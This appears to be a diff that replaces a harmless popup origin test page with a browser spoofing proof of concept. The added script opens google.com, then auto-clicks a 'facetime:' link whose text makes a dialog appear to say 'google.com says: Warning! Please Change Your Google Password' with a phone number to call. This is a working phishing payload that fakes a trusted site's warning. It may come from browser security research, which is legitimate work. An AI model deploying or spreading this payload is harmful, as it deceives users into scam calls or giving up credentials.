@@ -1,34 +1,20 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Arc Origin Visibility Test</title>
-<style>
-body { font-family: sans-serif; text-align: center; margin-top: 100px; }
-button { padding: 15px 30px; font-size: 18px; }
-</style>
-</head>
-<body>
 
-<h2>Popup Origin Visibility Test</h2>
-<button onclick="openTest()">Open Secure Popup</button>
+<html> <body> <script> function cc(){ window.open("http://www.google.com"); }
 
-<script>
-function openTest() {
-    const testWindow = window.open(
-        "https://example.com",
-        "_blank"
-    );
+function bb(){
+var link = document.createElement('a');
+link.href = 'facetime:google.com says:%0a%0dWarning!Please%20Change%20Your%20Google%20Password%0a%0dCall:0987-65432';
+link.click();
+document.body.appendChild(link);
+}
 
-    setTimeout(() => {
-        try {
-            testWindow.document.title = "Testing Origin Visibility";
-        } catch (e) {
-            console.log("Cross-origin access blocked (expected)");
-        }
-    }, 1000);
+function aa()
+{
+setTimeout('cc()','0');
+setTimeout('bb()','500');
+
 }
 </script>
 
-</body>
-</html>
+<button onclick="aa()">Click me</button>
+</body> </html> 
